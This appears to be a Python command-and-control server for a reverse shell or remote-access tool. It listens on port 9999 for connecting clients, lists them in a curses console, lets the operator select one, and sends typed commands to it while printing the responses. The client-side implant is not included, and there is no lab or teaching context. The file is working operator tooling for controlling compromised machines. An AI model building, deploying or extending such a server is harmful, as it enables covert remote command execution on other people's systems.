import socket
import threading
import curses
import os
import base64
import json

clients = {}
current_client = None

def send_command(client_socket, command):
    client_socket.sendall(command.encode())

def handle_client(client_socket, addr):
    global current_client
    clients[addr] = client_socket
    if not current_client:
        current_client = addr
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break
            print(f"\n[From {addr}]: {data.decode()}")
        except:
            break
    client_socket.close()
    del clients[addr]

def client_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print("[*] Waiting for connections...")
    while True:
        client_socket, addr = server.accept()
        print(f"[+] Client connected: {addr}")
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

def command_loop(stdscr):
    global current_client
    stdscr.clear()
    while True:
        stdscr.addstr(0, 0, f"Connected Clients: {list(clients.keys())}")
        stdscr.addstr(1, 0, f"Current: {current_client}")
        stdscr.addstr(2, 0, "Command > ")
        stdscr.refresh()
        cmd = stdscr.getstr(3, 0).decode().strip()
        stdscr.clear()

        if cmd == "rc":
            stdscr.addstr(0, 0, "Available Clients:")
            for idx, client in enumerate(clients.keys()):
                stdscr.addstr(idx + 1, 0, f"{idx + 1}. {client}")
            stdscr.addstr(len(clients) + 2, 0, "Select > ")
            idx = int(stdscr.getstr(len(clients) + 3, 0)) - 1
            current_client = list(clients.keys())[idx]
        else:
            if current_client:
                send_command(clients[current_client], cmd)
            else:
                stdscr.addstr(0, 0, "No client selected!")

if __name__ == "__main__":
    threading.Thread(target=client_listener, daemon=True).start()
    curses.wrapper(command_loop)
